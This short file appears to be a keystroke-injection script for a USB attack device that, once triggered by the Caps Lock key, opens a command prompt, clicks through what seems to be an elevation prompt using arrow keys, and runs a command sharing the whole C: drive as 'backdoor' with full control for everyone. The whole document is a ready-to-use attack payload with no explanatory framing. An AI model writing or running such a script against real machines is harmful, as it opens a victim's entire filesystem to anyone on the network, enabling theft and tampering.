layout('us');
typingSpeed(0,0);

waitLEDRepeat(CAPS);
press("GUI r");
delay(150);
type('cmd\n');
delay(150);
press('LEFT');
delay(150);
press('DOWN');
delay(150);
type('\n');
delay(150);
press('LEFT');
delay(150);
type('\n');
delay(150);
type('net share backdoor=C:\ /GRANT:everyone,FULL \n')
delay(150);
type('exit\n')
